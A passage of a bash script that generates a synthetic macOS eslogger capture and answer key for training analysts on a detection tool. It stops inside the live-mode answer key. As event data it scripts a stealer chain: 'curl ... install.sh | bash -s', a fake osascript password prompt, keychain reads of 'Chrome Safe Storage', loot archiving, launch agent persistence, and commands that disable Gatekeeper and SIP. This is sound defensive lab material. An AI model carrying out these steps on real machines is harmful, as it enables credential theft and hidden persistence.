#!/bin/bash
# ficus-lab.sh: writes an eslogger capture for learning Ficus, with an answer key beside it.
#
#   scripts/ficus-lab.sh synthetic [-o FILE | --stdout | --answers]
#   scripts/ficus-lab.sh live      [-o FILE | --answers]
#   scripts/ficus-lab.sh --help
#
# synthetic  builds the capture by hand: invented user `learner` (uid 502), invented pids, tokens and team IDs, fixed
#            times. No noise, the same bytes on every run, safe on any machine. Pure bash (3.2 or later).
# live       runs harmless versions of the same attack steps on this Mac while `sudo eslogger` records, so the capture
#            has the real background noise of a Mac around them. See --help for what it does to the machine.
#
# Either way the answer key (FILE with .jsonl replaced by .answers.tsv) lists, for each step, the rule it should set
# off, the severity, how the row appears in the queue, a marker to find it by and a note on what the step imitates.
# Default FILE: scratch/ficus-lab-<mode>.jsonl in the repo (scratch/ is gitignored).

export LC_ALL=C

usage() {
  cat <<'EOF'
Usage:
  ficus-lab.sh synthetic [-o FILE | --stdout | --answers]
  ficus-lab.sh live      [-o FILE | --answers]

synthetic  Write a hand-built capture that sets off every Ficus rule, with no noise.
           --stdout prints the capture, --answers prints the answer key; -o FILE writes both
           (FILE and FILE minus .jsonl plus .answers.tsv). Default: scratch/ficus-lab-synthetic.jsonl.

live       Run harmless versions of the attack steps on this Mac while `sudo eslogger` records.
           macOS only; run it as yourself, not with sudo (it asks for your password for eslogger only).
           It shows a dialog (type anything, or wait), macOS will likely show a "Background Items Added"
           notification for the lab's launch agent, and everything it creates is removed at the end, also on
           Ctrl-C. The capture holds every process's environment and your user name: review it before sharing.
           --answers prints the answer key without running anything. Default: scratch/ficus-lab-live.jsonl.

Load the .jsonl into Ficus and check what you find against the .answers.tsv.
EOF
}

die() {
  printf 'ficus-lab: %s\n' "$*" >&2
  exit 1
}

# ---- JSON -------------------------------------------------------------------------------------------------------
# Control characters other than \n \r \t, built once so json_str needs no subshell.
CTRL_CHARS=()
CTRL_CODES=()
for _i in 1 2 3 4 5 6 7 8 11 12 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31; do
  printf -v _oct '%03o' "$_i"
  printf -v _ch "\\$_oct"
  printf -v _code '\\u%04x' "$_i"
  CTRL_CHARS[${#CTRL_CHARS[@]}]=$_ch
  CTRL_CODES[${#CTRL_CODES[@]}]=$_code
done
unset _i _oct _ch _code
BS='\'
DQ='"'
NL=$'\n'
CR=$'\r'
TAB=$'\t'

# json_str STRING: the string as a JSON string literal, quotes included, in JSON_OUT (and printed by json_str).
json_esc() {
  local s=$1 i
  s=${s//"$BS"/"$BS$BS"}
  s=${s//"$DQ"/"$BS$DQ"}
  s=${s//"$NL"/"${BS}n"}
  s=${s//"$CR"/"${BS}r"}
  s=${s//"$TAB"/"${BS}t"}
  case $s in
    *[$'\001'-$'\037']*)
      for ((i = 0; i < ${#CTRL_CHARS[@]}; i++)); do s=${s//"${CTRL_CHARS[i]}"/"${CTRL_CODES[i]}"}; done ;;
  esac
  JSON_OUT="\"$s\""
}
json_str() {
  json_esc "$1"
  printf '%s' "$JSON_OUT"
}

# json_arr STRING...: a JSON array of strings, in JSON_OUT.
json_arr() {
  local out='' a
  for a in "$@"; do
    json_esc "$a"
    out="${out:+$out,}$JSON_OUT"
  done
  JSON_OUT="[$out]"
}

# Optional string: JSON null when empty.
json_opt() {
  if [ -z "$1" ]; then JSON_OUT=null; else json_esc "$1"; fi
}

# ---- clock ------------------------------------------------------------------------------------------------------
# Times are seconds after 2026-03-14T10:00:00Z, given as decimals ("5.2"). Integer arithmetic only.
CAPTURE_START_MS=$((10 * 3600 * 1000))   # milliseconds after midnight
LAST_MS=-1
SEQ=0
THREAD=4100

# to_ms SECONDS: milliseconds (integer, may be negative) in MS.
to_ms() {
  local s=$1 sign=1 int frac
  case $s in -*) sign=-1; s=${s#-} ;; esac
  int=${s%%.*}
  if [ "$int" = "$s" ]; then frac=0; else frac=${s#*.}; fi
  frac=${frac}000
  frac=${frac:0:3}
  MS=$((sign * (10#$int * 1000 + 10#$frac)))
}

# iso MS_AFTER_START [EXTRA_DIGITS]: an eslogger timestamp with nine fractional digits, in ISO.
iso() {
  local t=$((CAPTURE_START_MS + $1)) extra=${2:-000000}
  local h=$((t / 3600000)) m=$((t / 60000 % 60)) s=$((t / 1000 % 60)) f=$((t % 1000))
  printf -v ISO '2026-03-14T%02d:%02d:%02d.%03d%sZ' "$h" "$m" "$s" "$f" "$extra"
}

# ---- processes --------------------------------------------------------------------------------------------------
# A registry of processes in parallel arrays, indexed by a handle. kind: platform, team, adhoc or unsigned.
FLAGS_platform=637631233   # platform binary, hardened, valid
FLAGS_team=570491649       # developer-signed, valid
FLAGS_adhoc=131075         # 0x20003: valid, ad-hoc, linker-signed
FLAGS_unsigned=0
NPROC=0
P_PID=(); P_PV=(); P_PATH=(); P_KIND=(); P_SID=(); P_TEAM=(); P_PPID=(); P_OPPID=(); P_PARENT=(); P_RESP=()
P_RUID=(); P_EUID=(); P_RGID=(); P_EGID=(); P_AUID=(); P_ASID=(); P_START=(); P_SESSION=(); P_GROUP=()

USER_UID=502
USER_GID=20

# new_proc VAR pid pv path kind signing_id team_id parent_handle start_seconds [uid gid]
#   A process that exists when the story starts (or a ghost: never seen, only named as someone's parent).
#   parent_handle may be empty for launchd. uid 0 makes a root process. Its responsible process is itself.
new_proc() {
  local var=$1 h=$NPROC
  NPROC=$((NPROC + 1))
  P_PID[h]=$2; P_PV[h]=$3; P_PATH[h]=$4; P_KIND[h]=$5; P_SID[h]=$6; P_TEAM[h]=$7
  P_PARENT[h]=${8:-$h}
  P_PPID[h]=${P_PID[${P_PARENT[h]}]}
  [ "$h" = "${P_PARENT[h]}" ] && P_PPID[h]=0
  P_OPPID[h]=${P_PPID[h]}
  P_RESP[h]=$h
  to_ms "$9"; P_START[h]=$MS
  local uid=${10:-$USER_UID} gid=${11:-$USER_GID}
  P_RUID[h]=$uid; P_EUID[h]=$uid; P_RGID[h]=$gid; P_EGID[h]=$gid
  if [ "$uid" = 0 ]; then P_AUID[h]=4294967295; P_ASID[h]=100019; else P_AUID[h]=$uid; P_ASID[h]=100020; fi
  P_SESSION[h]=$2; P_GROUP[h]=$2
  printf -v "$var" '%s' "$h"
}

# set_ids handle ruid euid rgid egid: the process's real and effective ids from now on.
set_ids() {
  P_RUID[$1]=$2; P_EUID[$1]=$3; P_RGID[$1]=$4; P_EGID[$1]=$5
}

# token handle: an audit token, in JSON_OUT.
token() {
  local h=$1
  JSON_OUT="{\"auid\":${P_AUID[h]},\"ruid\":${P_RUID[h]},\"rgid\":${P_RGID[h]},\"egid\":${P_EGID[h]},\"euid\":${P_EUID[h]},\"asid\":${P_ASID[h]},\"pid\":${P_PID[h]},\"pidversion\":${P_PV[h]}}"
}

# proc_obj handle: eslogger's process object for the process as it is now, in PROC_OUT.
proc_obj() {
  local h=$1 kind=${P_KIND[$1]} flags platform cat tok ptok rtok sid team path start
  eval "flags=\$FLAGS_$kind"
  if [ "$kind" = platform ]; then platform=true; cat=1; else platform=false; cat=6; fi
  token "$h"; tok=$JSON_OUT
  token "${P_PARENT[h]}"; ptok=$JSON_OUT
  token "${P_RESP[h]}"; rtok=$JSON_OUT
  json_opt "${P_SID[h]}"; sid=$JSON_OUT
  json_opt "${P_TEAM[h]}"; team=$JSON_OUT
  json_esc "${P_PATH[h]}"; path=$JSON_OUT
  iso "${P_START[h]}" "$(printf '%06d' $((P_PID[h] % 1000 * 1000)))"; start=$ISO
  printf -v PROC_OUT '{"tty":null,"start_time":"%s","session_id":%s,"is_es_client":false,"ppid":%s,"is_platform_binary":%s,"original_ppid":%s,"team_id":%s,"cdhash":"%08X%08X%08X%08X%08X","parent_audit_token":%s,"cs_validation_category":%s,"executable":{"path_truncated":false,"path":%s},"signing_id":%s,"group_id":%s,"codesigning_flags":%s,"audit_token":%s,"responsible_audit_token":%s}' \
    "$start" "${P_SESSION[h]}" "${P_PPID[h]}" "$platform" "${P_OPPID[h]}" "$team" \
    "${P_PID[h]}" "${P_PV[h]}" "$flags" "${#P_PATH[h]}" "$((P_PID[h] * 7 + P_PV[h]))" \
    "$ptok" "$cat" "$path" "$sid" "${P_GROUP[h]}" "$flags" "$tok" "$rtok"
}

# ---- events -----------------------------------------------------------------------------------------------------
# Events go to fd 3 in call order, which must be time order; answer rows go to fd 4.
EV_exec=9; EV_fork=11; EV_create=13; EV_exit=15; EV_rename=25; EV_btm_launch_item_add=124

# emit SECONDS handle event_name body_json
emit() {
  to_ms "$1"
  [ "$MS" -ge "$LAST_MS" ] || die "event at $1 s is earlier than the one before it"
  LAST_MS=$MS
  local type
  eval "type=\$EV_$3"
  proc_obj "$2"
  iso "$MS" "$(printf '%03d%03d' $((SEQ % 7 * 100)) $((SEQ % 1000)))"
  printf '{"action":{"result":{"result_type":0,"result":{"auth":0}}},"version":11,"action_type":1,"event_type":%s,"thread":{"thread_id":%s},"process":%s,"schema_version":1,"seq_num":0,"event":{"%s":%s},"time":"%s","global_seq_num":%s,"mach_time":%s}\n' \
    "$type" "$THREAD" "$PROC_OUT" "$3" "$4" "$ISO" "$SEQ" "$((2400000000000 + SEQ * 40000))" >&3
  THREAD=$((THREAD + 1))
  SEQ=$((SEQ + 1))
}

# ev_fork SECONDS parent child_pid child_pv: the parent forks; the child's handle is in LAST.
ev_fork() {
  local p=$2 c=$NPROC
  NPROC=$((NPROC + 1))
  P_PID[c]=$3; P_PV[c]=$4; P_PATH[c]=${P_PATH[p]}; P_KIND[c]=${P_KIND[p]}; P_SID[c]=${P_SID[p]}; P_TEAM[c]=${P_TEAM[p]}
  P_PARENT[c]=$p; P_PPID[c]=${P_PID[p]}; P_OPPID[c]=${P_PID[p]}; P_RESP[c]=${P_RESP[p]}
  P_RUID[c]=${P_RUID[p]}; P_EUID[c]=${P_EUID[p]}; P_RGID[c]=${P_RGID[p]}; P_EGID[c]=${P_EGID[p]}
  P_AUID[c]=${P_AUID[p]}; P_ASID[c]=${P_ASID[p]}; P_SESSION[c]=${P_SESSION[p]}; P_GROUP[c]=${P_GROUP[p]}
  to_ms "$1"; P_START[c]=$((MS - 1))
  proc_obj "$c"
  emit "$1" "$p" fork "{\"child\":$PROC_OUT}"
  LAST=$c
}

ENV_JSON='["HOME=/Users/learner","LANG=C.UTF-8","LOGNAME=learner","PATH=/usr/local/bin:/usr/bin:/bin","SHELL=/bin/zsh","USER=learner"]'
FDS_tty='[{"fd":0,"fdtype":1},{"fd":1,"fdtype":1},{"fd":2,"fdtype":1}]'
FDS_pipe='[{"fd":0,"fdtype":6,"pipe":{"pipe_id":100231}},{"fd":1,"fdtype":1},{"fd":2,"fdtype":1}]'
EXEC_SCRIPT=''   # set before ev_exec for a script run through its interpreter; reset by it
EXEC_IDS=''      # "ruid euid rgid egid" set before ev_exec for a setuid program; reset by it

# ev_exec SECONDS handle path kind signing_id team_id cwd fds(tty|pipe) ARGS...
#   The event carries the process before the exec and, as its target, the process after it.
ev_exec() {
  local sec=$1 h=$2 before args cwd script fds
  proc_obj "$h"; before=$PROC_OUT
  # A setuid program changes the ids at the exec: only the new image runs with them.
  if [ -n "$EXEC_IDS" ]; then set_ids "$h" $EXEC_IDS; EXEC_IDS=''; fi
  P_PATH[h]=$3; P_KIND[h]=$4; P_SID[h]=$5; P_TEAM[h]=$6
  P_PV[h]=$((P_PV[h] + 1))
  json_esc "$7"; cwd=$JSON_OUT
  eval "fds=\$FDS_$8"
  shift 8
  json_arr "$@"; args=$JSON_OUT
  if [ -n "$EXEC_SCRIPT" ]; then json_esc "$EXEC_SCRIPT"; script="{\"path_truncated\":false,\"path\":$JSON_OUT}"; else script=null; fi
  EXEC_SCRIPT=''
  proc_obj "$h"
  local path
  json_esc "${P_PATH[h]}"; path=$JSON_OUT
  # emit prints the process object of `h` as it is now, so swap in the "before" object for this one event.
  local after=$PROC_OUT
  PROC_BEFORE=$before
  emit_as_before "$sec" exec "{\"image_cpusubtype\":2,\"script\":$script,\"cwd\":{\"path_truncated\":false,\"path\":$cwd},\"target\":$after,\"entitlements\":{},\"dyld_exec_path\":$path,\"fds\":$fds,\"env\":$ENV_JSON,\"args\":$args,\"image_cputype\":16777228,\"last_fd\":2}"
}

# emit_as_before SECONDS event_name body: like emit, with PROC_BEFORE as the process object.
emit_as_before() {
  to_ms "$1"
  [ "$MS" -ge "$LAST_MS" ] || die "event at $1 s is earlier than the one before it"
  LAST_MS=$MS
  local type
  eval "type=\$EV_$2"
  iso "$MS" "$(printf '%03d%03d' $((SEQ % 7 * 100)) $((SEQ % 1000)))"
  printf '{"action":{"result":{"result_type":0,"result":{"auth":0}}},"version":11,"action_type":1,"event_type":%s,"thread":{"thread_id":%s},"process":%s,"schema_version":1,"seq_num":0,"event":{"%s":%s},"time":"%s","global_seq_num":%s,"mach_time":%s}\n' \
    "$type" "$THREAD" "$PROC_BEFORE" "$2" "$3" "$ISO" "$SEQ" "$((2400000000000 + SEQ * 40000))" >&3
  THREAD=$((THREAD + 1))
  SEQ=$((SEQ + 1))
}

ev_exit() { emit "$1" "$2" exit '{"stat":0}'; }

file_obj() { json_esc "$1"; FILE_OUT="{\"path_truncated\":false,\"path\":$JSON_OUT}"; }

# ev_create SECONDS handle full_path: a new file (eslogger names where it will be: directory plus file name).
ev_create() {
  local dir=${3%/*} name=${3##*/} d n
  file_obj "$dir"; d=$FILE_OUT
  json_esc "$name"; n=$JSON_OUT
  emit "$1" "$2" create "{\"destination\":{\"new_path\":{\"dir\":$d,\"filename\":$n,\"mode\":33188}},\"destination_type\":1,\"acl\":null}"
}

# ev_rename SECONDS handle from to
ev_rename() {
  local f t
  file_obj "$3"; f=$FILE_OUT
  file_obj "$4"; t=$FILE_OUT
  emit "$1" "$2" rename "{\"destination\":{\"existing_file\":$t},\"destination_type\":0,\"source\":$f}"
}

# ev_btm_add SECONDS item_url app_url item_type executable_path [app_handle]
#   backgroundtaskmanagementd (BTMD) reports a launch item registered; smd (SMD) is the XPC caller that asked for it.
#   item_type: 0 user item, 1 app, 2 login item, 3 launch agent, 4 launch daemon. Empty app_url or path: null.
ev_btm_add() {
  local iu au ex app=null apptok=null itok inst
  json_opt "$2"; iu=$JSON_OUT
  json_opt "$3"; au=$JSON_OUT
  json_opt "$5"; ex=$JSON_OUT
  if [ -n "${6:-}" ]; then proc_obj "$6"; app=$PROC_OUT; token "$6"; apptok=$JSON_OUT; fi
  proc_obj "$SMD"; inst=$PROC_OUT
  token "$SMD"; itok=$JSON_OUT
  emit "$1" "$BTMD" btm_launch_item_add "{\"app_token\":$apptok,\"executable_path\":$ex,\"instigator_token\":$itok,\"app\":$app,\"instigator\":$inst,\"item\":{\"uid\":$USER_UID,\"item_url\":$iu,\"app_url\":$au,\"legacy\":$([ "$4" = 3 ] || [ "$4" = 4 ] && echo true || echo false),\"item_type\":$4,\"managed\":false}}"
}

# answer step rule severity queue marker note: one row of the answer key.
answer() {
  printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$@" >&4
}
answer_header() {
  printf 'step\trule\tseverity\tqueue\tmarker\tnote\n' >&4
}

# ---- the synthetic story ----------------------------------------------------------------------------------------
# sec_plus SECONDS MILLISECONDS: a later time, as seconds with three decimals, in SEC_OUT.
sec_plus() {
  to_ms "$1"
  local t=$((MS + $2))
  printf -v SEC_OUT '%d.%03d' $((t / 1000)) $((t % 1000))
}

CWD=/Users/learner
# run_as SECONDS parent pid pv path kind signing_id team_id ARGS...: the parent forks a child that execs the program
#   100 ms later and exits 300 ms after the fork. The child's handle is in LAST.
run_as() {
  local sec=$1 parent=$2 pid=$3 pv=$4 path=$5 kind=$6 sid=$7 team=$8 c t1 t2
  shift 8
  ev_fork "$sec" "$parent" "$pid" "$pv"; c=$LAST
  sec_plus "$sec" 100; t1=$SEC_OUT
  sec_plus "$sec" 300; t2=$SEC_OUT
  ev_exec "$t1" "$c" "$path" "$kind" "$sid" "$team" "$CWD" tty "$@"
  ev_exit "$t2" "$c"
  LAST=$c
}
# run SECONDS parent pid pv path ARGS...: run_as for an Apple program (signing ID com.apple.<name>).
run() {
  local sec=$1 parent=$2 pid=$3 pv=$4 path=$5
  shift 5
  run_as "$sec" "$parent" "$pid" "$pv" "$path" platform "com.apple.${path##*/}" '' "$@"
}

# The story (seconds after 10:00:00): `learner` downloads a fake installer and runs its install script, which drops
# a stealer agent; the agent fakes a password prompt, reads the keychain, stages what it found and makes itself
# persistent. Around it: other things the rules notice, some of them ordinary.
#    1  zsh: curl -o /tmp/lab/Installer.dmg; 3: xattr -d com.apple.quarantine on it
#    5  curl ... install.sh | bash -s; the piped bash runs whoami (in chain), base64 -d (the agent's binary),
#       then the agent: ad-hoc signed, in a hidden folder in Application Support
#    8..22  the agent: osascript fake password prompt, dscl -authonly, security for "Chrome Safe Storage" and for a
#       web password, osascript running a script file in /tmp, ditto staging in /tmp, tee writing a launch agent plist
#       (with its btm event: runs /bin/sh), launchctl bootstrap, cp writing a second plist nothing registers
#    2, 30  Monitor.app (team-signed) runs ps (an Apple setuid tool) and a helper from /var/folders: context only
#   25  Lab Notes.app runs /bin/sh -c
#   33..44  zsh: zip in Documents, a setuid helper (euid 0), an attribute-only keychain lookup (context), spctl
#       --master-disable, csrutil disable, networksetup -setwebproxy, an unsigned updater in /Users/Shared,
#       (sleep 600 &) which ends up under launchd
#   45  launchd starts a vendor daemon that runs as root with the user's effective id: dropped privileges, context
#   46  a standalone launch agent for an updater app, no process tied to it
#   50..53  a second shell runs sw_vers, uname -a, system_profiler: a recon burst
synthetic_story() {
  answer_header
  local LAUNCHD TERMINAL LOGIN ZSH MONITOR NOTES TERMINAL2 ZSH2 SHELL2 bash curl agent sub sl daemon c
  local LAB=/private/tmp/lab
  local SUPPORT='/Users/learner/Library/Application Support/.syncd'
  local AGENTS=/Users/learner/Library/LaunchAgents
  new_proc LAUNCHD 1 1021 /sbin/launchd platform com.apple.launchd '' '' -3600 0 0
  new_proc BTMD 770 1730 /System/Library/PrivateFrameworks/BackgroundTaskManagement.framework/Versions/A/Resources/backgroundtaskmanagementd platform com.apple.backgroundtaskmanagementd '' "$LAUNCHD" -3590 0 0
  new_proc SMD 560 1390 /usr/libexec/smd platform com.apple.xpc.smd '' "$LAUNCHD" -3590 0 0
  new_proc TERMINAL 6100 8100 /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal platform com.apple.Terminal '' "$LAUNCHD" -3000
  new_proc LOGIN 6120 8120 /usr/bin/login platform com.apple.login '' "$TERMINAL" -2990
  new_proc ZSH 6130 8130 /bin/zsh platform com.apple.zsh '' "$LOGIN" -2980
  P_RESP[ZSH]=$TERMINAL
  new_proc MONITOR 5200 5201 /Applications/Monitor.app/Contents/MacOS/Monitor team com.example.monitor LAB0AAAA01 "$LAUNCHD" -7200
  new_proc NOTES 5300 5301 '/Applications/Lab Notes.app/Contents/MacOS/Lab Notes' team com.example.labnotes LAB0BBBB02 "$LAUNCHD" -5400
  new_proc SHELL2 6390 8390 /usr/bin/login platform com.apple.login '' "$TERMINAL" -600
  new_proc ZSH2 6400 8400 /bin/zsh platform com.apple.zsh '' "$SHELL2" -590
  P_RESP[ZSH2]=$TERMINAL

  # 1. The download, and its quarantine flag stripped.
  ev_fork 1.0 "$ZSH" 7001 9001; curl=$LAST
  ev_exec 1.1 "$curl" /usr/bin/curl platform com.apple.curl '' "$CWD" tty curl -sL -o /tmp/lab/Installer.dmg https://downloads.example.com/Installer.dmg
  ev_create 1.4 "$curl" "$LAB/Installer.dmg"
  ev_exit 1.6 "$curl"
  answer download download med queued 'https://downloads.example.com' 'curl saved a file to disk: the fake installer arrives.'

  # Monitor.app's routine ps: an Apple setuid tool, so it runs with euid 0. Context only.
  EXEC_IDS="$USER_UID 0 $USER_GID $USER_GID"
  run_as 2.0 "$MONITOR" 7200 9200 /bin/ps platform com.apple.ps '' ps -axo pid,comm
  answer monitor-ps recon low context 'ps -axo' 'A monitoring app lists processes: recon on its own is context, not queued.'
  answer monitor-ps uid-mismatch low context 'ps -axo' 'ps is setuid root by design: an allow-listed Apple tool, context only.'

  run 3.0 "$ZSH" 7002 9011 /usr/bin/xattr xattr -d com.apple.quarantine /tmp/lab/Installer.dmg
  answer quarantine quarantine-strip high queued 'com.apple.quarantine' 'Removing the quarantine flag stops Gatekeeper checking the download.'

  # 2. curl ... | bash -s: the install script arrives through a pipe.
  ev_fork 5.0 "$ZSH" 7003 9021; curl=$LAST
  ev_fork 5.0 "$ZSH" 7004 9031; bash=$LAST
  ev_exec 5.1 "$curl" /usr/bin/curl platform com.apple.curl '' "$CWD" tty curl -fsSL https://example.com/install.sh
  ev_exec 5.2 "$bash" /bin/bash platform com.apple.bash '' "$CWD" pipe bash -s
  ev_exit 5.5 "$curl"
  answer pipe shell-from-pipe med queued 'bash -s' 'bash runs a script piped from curl: no script file on disk to inspect.'
  run 5.6 "$bash" 7005 9041 /usr/bin/whoami whoami
  answer pipe-whoami recon low in-chain whoami 'whoami alone is nothing, but it runs under the piped bash, so it is in a flagged chain.'
  run 6.0 "$bash" 7006 9051 /usr/bin/base64 base64 -d -i /tmp/lab/payload.b64 -o "$SUPPORT/syncd"
  answer decode payload-decode med queued 'payload.b64' 'base64 -d unpacks the hidden agent binary.'

  # 3. The agent: ad-hoc signed, hidden in Application Support.
  ev_fork 7.0 "$bash" 7010 9061; agent=$LAST
  ev_exec 7.1 "$agent" "$SUPPORT/syncd" adhoc syncd-55554944f0be3f1f '' "$CWD" tty syncd --daemon
  answer agent odd-location-exec high queued 'syncd --daemon' 'An ad-hoc signed program running from a hidden folder in the home folder.'
  answer agent adhoc low queued 'syncd --daemon' 'Ad-hoc signed: no developer identity. Shown because the process is flagged anyway.'
  ev_fork 8.0 "$agent" 7011 9071; c=$LAST
  ev_exec 8.1 "$c" /usr/bin/osascript platform com.apple.osascript '' "$CWD" tty osascript -e 'display dialog "macOS needs your password to install a helper." default answer "" with hidden answer with title "System Settings"'
  ev_exit 14.0 "$c"
  answer prompt fake-prompt high queued 'with hidden answer' 'A fake password prompt: the typed text is hidden as dots.'
  run 14.5 "$agent" 7012 9081 /usr/bin/dscl dscl . -authonly learner hunter2-lab
  answer prompt-check dscl-authonly high queued '-authonly' 'Checking whether the phished password is right.'
  run 15.5 "$agent" 7013 9091 /usr/bin/security security find-generic-password -s 'Chrome Safe Storage' -w
  answer keychain keychain-access high queued 'Chrome Safe Storage' "Printing the key that decrypts the browser's saved passwords and cookies."
  run 16.5 "$agent" 7014 9101 /usr/bin/security security find-internet-password -s accounts.example.com -w
  answer keychain-web keychain-access med queued 'accounts.example.com' 'Printing a saved web password.'
  run 17.5 "$agent" 7015 9111 /usr/bin/osascript osascript /tmp/lab/collect.scpt
  answer collect osascript-script med queued 'collect.scpt' 'osascript runs a script file from /tmp.'
  run 18.5 "$agent" 7016 9121 /usr/bin/ditto ditto -c -k --sequesterRsrc /tmp/lab/loot /tmp/lab/loot.zip
  answer staging archive-staging high queued 'loot.zip' 'Collected files packed into an archive in /tmp, ready to send.'

  # 4. Persistence: tee writes a launch agent plist and the system registers it; launchctl starts it now;
  #    cp writes a second plist that nothing registers.
  ev_fork 19.5 "$agent" 7017 9131; c=$LAST
  ev_exec 19.6 "$c" /usr/bin/tee platform com.apple.tee '' "$CWD" pipe tee "$AGENTS/com.learner.syncd.plist"
  ev_create 19.7 "$c" "$AGENTS/com.learner.syncd.plist"
  ev_exit 19.8 "$c"
  ev_btm_add 20.0 "file://$AGENTS/com.learner.syncd.plist" '' 3 /bin/sh
  answer persist persistence-item high queued 'tee /Users' 'A launch agent registered that runs a shell: it starts again at every login.'
  run 21.0 "$agent" 7018 9141 /bin/launchctl launchctl bootstrap gui/502 "$AGENTS/com.learner.syncd.plist"
  answer persist-load launchctl-load high queued 'launchctl bootstrap' 'launchctl starts the job now instead of at the next login.'
  ev_fork 22.0 "$agent" 7019 9151; c=$LAST
  ev_exec 22.1 "$c" /bin/cp platform com.apple.cp '' "$CWD" tty cp /tmp/lab/helper.plist "$AGENTS/com.learner.helper.plist"
  ev_create 22.2 "$c" "$AGENTS/com.learner.helper.plist"
  ev_exit 22.3 "$c"
  answer persist-plist persistence-plist high queued 'com.learner.helper.plist' 'A second launch agent plist written, with no registration event in the capture.'

  # Lab Notes.app runs a shell.
  run_as 25.0 "$NOTES" 7300 9300 /bin/sh platform com.apple.sh '' sh -c 'echo synced > /tmp/labnotes.log'
  answer app-shell shell-under-app med queued 'echo synced' 'An app (not a terminal or editor) launched a shell.'

  # Monitor.app runs a team-signed helper from /var/folders: low, context only.
  run_as 30.0 "$MONITOR" 7201 9210 /private/var/folders/zz/lab0000000000000000000000/T/Monitor/refresh team com.example.monitor.refresh LAB0AAAA01 refresh --background-refresh
  answer monitor-refresh odd-location-exec low context '--background-refresh' 'A developer-signed helper run from a temporary folder: weak on its own.'

  # 5. More from the shell.
  run 33.0 "$ZSH" 7020 9161 /usr/bin/zip zip -r /Users/learner/Documents/notes-backup.zip /Users/learner/Documents/notes
  answer backup archive-staging med queued 'notes-backup.zip' 'An archive made in an ordinary folder: med, look at what was packed.'
  EXEC_IDS="$USER_UID 0 $USER_GID $USER_GID"
  run_as 35.0 "$ZSH" 7021 9171 '/Applications/Helper Tool.app/Contents/MacOS/helper' team com.example.helpertool LAB0CCCC03 helper --install-helper
  answer setuid uid-mismatch high queued '--install-helper' 'A non-Apple program running with root as its effective user: a setuid binary.'
  run 37.0 "$ZSH" 7022 9181 /usr/bin/security security find-generic-password -s com.learner.notes
  answer keychain-attr keychain-access low context 'com.learner.notes' 'A keychain lookup that prints no secret: context only.'
  run 38.0 "$ZSH" 7023 9191 /usr/sbin/spctl spctl --master-disable
  answer gatekeeper security-setting-change high queued '--master-disable' 'Turning Gatekeeper off.'
  run 39.0 "$ZSH" 7024 9201 /usr/bin/csrutil csrutil disable
  answer sip security-setting-change high queued 'csrutil disable' 'Turning System Integrity Protection off (only works from Recovery).'
  run 40.0 "$ZSH" 7025 9211 /usr/sbin/networksetup networksetup -setwebproxy Wi-Fi 127.0.0.1 8080
  answer proxy security-setting-change med queued '-setwebproxy' 'Sending web traffic through a proxy someone chose.'
  run_as 42.0 "$ZSH" 7026 9221 /Users/Shared/Updater/updater unsigned '' '' updater --check
  answer unsigned unsigned med queued 'updater --check' 'A program with no code signature at all.'
  answer unsigned odd-location-exec high queued 'updater --check' 'An unsigned program running from /Users/Shared, which every user can write to.'

  # (sleep 600 &): the subshell exits, the sleep ends up under launchd.
  ev_fork 44.0 "$ZSH" 7027 9231; sub=$LAST
  ev_fork 44.1 "$sub" 7028 9241; sl=$LAST
  ev_exec 44.2 "$sl" /bin/sleep platform com.apple.sleep '' "$CWD" tty sleep 600
  ev_exit 44.4 "$sub"
  P_PPID[sl]=1; P_PARENT[sl]=$LAUNCHD

  # 6. launchd starts a vendor daemon that runs as root with the user's effective id.
  ev_fork 45.0 "$LAUNCHD" 7400 9400; daemon=$LAST
  EXEC_IDS="0 $USER_UID 0 $USER_GID"
  ev_exec 45.1 "$daemon" /Library/PrivilegedHelperTools/com.example.agent team com.example.agent LAB0DDDD04 / tty /Library/PrivilegedHelperTools/com.example.agent --serve
  answer drop uid-mismatch low context '--serve' 'Root running with the user'"'"'s effective id: it gave privileges up, which is context, not escalation.'

  # 7. A standalone launch agent for an updater app: no process in the capture is tied to it.
  ev_btm_add 46.0 'file:///Users/learner/Library/LaunchAgents/com.example.updater.wake.plist' 'file:///Users/learner/Library/Application%20Support/Example/Updater.app/' 3 '/Users/learner/Library/Application Support/Example/Updater.app/Contents/MacOS/Updater'
  answer updater persistence-item med item 'com.example.updater.wake' 'A launch item with no process in the capture: it gets its own row.'

  # 8. A recon burst: three different tools under one shell within 4 s.
  run 50.0 "$ZSH2" 7500 9500 /usr/bin/sw_vers sw_vers
  answer burst recon low burst sw_vers 'Three different discovery tools within a minute under one shell: a recon burst.'
  run 51.5 "$ZSH2" 7501 9510 /usr/bin/uname uname -a
  answer burst recon low burst 'uname -a' 'Part of the same burst.'
  run 53.0 "$ZSH2" 7502 9520 /usr/sbin/system_profiler system_profiler SPHardwareDataType
  answer burst recon low burst system_profiler 'Part of the same burst.'

  ev_exit 55.0 "$daemon"
  ev_exit 60.0 "$bash"
  ev_exit 70.0 "$sl"
  answer orphan orphaned low queued 'sleep 600' 'Its parent exited, so it now sits under launchd: the double fork that detaches a process.'
}

# ---- live mode --------------------------------------------------------------------------------------------------
LIVE_LABEL=com.ficus.lab

# The answer key for a live capture. Markers match among the descendants of ficus-lab.sh.
live_answers() {
  answer_header
  printf '%s\n' \
    '# Live capture: search the Tree for "ficus-lab.sh __steps": every step runs under that process, in a folder' \
    '# /tmp/ficus-lab.XXXXXX; match each marker against the command lines of its descendants. Everything else' \
    '# in the capture is this Mac going about its business.' \
    '# The cp step: macOS names smd as the caller that registered the launch agent, and smd only relays requests,' \
    '# so the registration is credited to the process that wrote the plist: cp shows persistence-item. A plist' \
    '# written with no registration at all would show persistence-plist instead (the synthetic capture has one).' \
    '# Not set off in live mode (the synthetic capture has them):' \
    '#   unsigned: Apple Silicon refuses to run a program with no signature at all.' \
    '#   uid-mismatch high: needs a setuid-root copy of a program; the lab will not make one.' \
    '#   security-setting-change med, and the spctl, networksetup and certificate forms: an admin account may' \
    '#     succeed, or get a password prompt. Only csrutil, which refuses outside Recovery, runs.' \
    '#   keychain-access med and low: the lab makes one keychain call, for an item that does not exist.' \
    '#   persistence-item med on its own row: needs an app'"'"'s own launch agent.' >&4
  answer download download med queued 'file:///etc/hosts' 'curl saves a file to disk (from /etc/hosts, so no network is used).'
  answer pipe shell-from-pipe med queued 'bash -s' 'bash runs commands piped into it: no script file on disk to inspect.'
  answer pipe-whoami recon low in-chain whoami 'whoami under the piped bash: in a flagged chain.'
